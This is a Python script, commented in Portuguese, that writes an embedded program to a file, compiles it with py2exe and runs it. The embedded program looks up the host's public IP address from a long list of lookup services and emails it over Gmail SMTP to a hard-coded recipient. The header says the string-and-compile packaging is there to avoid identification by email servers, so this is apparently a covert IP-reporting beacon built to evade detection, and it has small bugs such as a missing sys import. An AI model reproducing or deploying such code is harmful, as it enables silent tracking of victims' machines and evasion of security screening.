'''
Codigo criado para tranformar o codigo de envio de emails uma string e depois passalo para outro arquivo
Isto evita identificacao por parte dos servidores de email
OBRIGADO A TODOS QUE COLABORARAM COM ESTE CODIGO!
'''
import os
import py2exe
code = '''#!/usr/bin/env python
#Forked By Phoemur

import re #Importando biblioteca re
import random #Importando biblioteca random
import smtplib

from sys import version_info #Importar do sistema apenas version_info

PY3K = version_info >= (3, 0)

if PY3K:
    import urllib.request as urllib
else:
    import urllib2 as urllib

__version__ = "0.6"


def myip():
    #Substitui as infomações de acordo com seu email
    texto = IPgetter().get_externalip()
    smtp = smtplib.SMTP("smtp.gmail.com:587")
    smtp.starttls()
    smtp.login("emailmaneiro@gmail.com", "senhamaneiro")
    remetente = "emailmaneiro@gmail.com"
    destinatario = ["destinomaneiro@gmail.com"]
    conteudo =  """From: %s
    To: %s
    Subject: ASSUNTO
    Conteudo %s.""" % (remetente, destinatario, texto)
    smtp.sendmail(remetente, destinatario, texto)
    smtp.quit
class IPgetter(object):



    def __init__(self):
        self.server_list = ['http://ip.dnsexit.com',
                            'http://ifconfig.me/ip',
                            'http://ipecho.net/plain',
                            'http://checkip.dyndns.org/plain',
                            'http://ipogre.com/linux.php',
                            'http://whatismyipaddress.com/',
                            'http://websiteipaddress.com/WhatIsMyIp',
                            'http://getmyipaddress.org/',
                            'http://www.my-ip-address.net/',
                            'http://myexternalip.com/raw',
                            'http://www.canyouseeme.org/',
                            'http://www.trackip.net/',
                            'http://icanhazip.com/',
                            'http://www.iplocation.net/',
                            'http://www.howtofindmyipaddress.com/',
                            'http://www.ipchicken.com/',
                            'http://whatsmyip.net/',
                            'http://www.ip-adress.com/',
                            'http://checkmyip.com/',
                            'http://www.tracemyip.org/',
                            'http://www.lawrencegoetz.com/programs/ipinfo/',
                            'http://www.findmyip.co/',
                            'http://ip-lookup.net/',
                            'http://www.dslreports.com/whois',
                            'http://www.mon-ip.com/en/my-ip/',
                            'http://www.myip.ru',
                            'http://ipgoat.com/',
                            'http://www.myipnumber.com/my-ip-address.asp',
                            'http://www.whatsmyipaddress.net/',
                            'http://formyip.com/',
                            'https://check.torproject.org/',
                            'http://www.displaymyip.com/',
                            'http://www.bobborst.com/tools/whatsmyip/',
                            'http://www.geoiptool.com/',
                            'https://www.whatsmydns.net/whats-my-ip-address.html',
                            'https://www.privateinternetaccess.com/pages/whats-my-ip/',
                            'http://checkip.dyndns.com/',
                            'http://myexternalip.com/',
                            'http://www.ip-adress.eu/',
                            'http://www.infosniper.net/',
                            'https://wtfismyip.com/text',
                            'http://ipinfo.io/',
                            'http://httpbin.org/ip',
                            'http://ip.ajn.me',
                            'https://diagnostic.opendns.com/myip',
                            'https://api.ipify.org']

    def get_externalip(self):
    

        myip = ''
        for i in range(7):
            myip = self.fetch(random.choice(self.server_list))
            if myip != '':
                return myip
            else:
                continue
        return ''

    def fetch(self, server):
        
        #This function gets your IP from a specific server.
        url = None
        opener = urllib.build_opener()
        opener.addheaders = [('User-agent',
                              "Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0")]

        try:
            url = opener.open(server, timeout=2)
            content = url.read()

            # Didn't want to import chardet. Prefered to stick to stdlib
            if PY3K:
                try:
                    content = content.decode('UTF-8')
                except UnicodeDecodeError:
                    content = content.decode('ISO-8859-1')

            m = re.search(
                '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)',
                content)
            myip = m.group(0)
            return myip if len(myip) > 0 else ''
        except Exception:
            return ''
        finally:
            if url:
                url.close()

    def test(self):
        
        #This functions tests the consistency of the servers
        #on the list when retrieving your IP.
        #All results should be the same.
        resultdict = {}
        for server in self.server_list:
            resultdict.update(**{server: self.fetch(server)})

        ips = sorted(resultdict.values())
        ips_set = set(ips)
        print("IP's :")
        for ip, ocorrencia in zip(ips_set, map(lambda x: ips.count(x), ips_set)):
            print('{0} = {1} ocurrenc{2}'.format(ip if len(ip) > 0 else 'broken server', ocorrencia, 'y' if ocorrencia == 1 else 'ies'))
        print(resultdict)

if __name__ == '__main__':
    print(myip())

'''
#Gravando o conteudo listado acima no arquivo send_ip.py
arquivo = open('send_ip.py', 'w')
arquivo.write(code)
arquivo.close()
#Executando o arquivo de instalacao do script que envia os emails
os.system('setup_ip.py')
#Fazendo a execucao do arquivo de email ja compilado pelo py2exe
try:
    os.system('\\PATH\\dist\\send_ip.exe')
except:
    print("Error")
    sys.exit(-1)
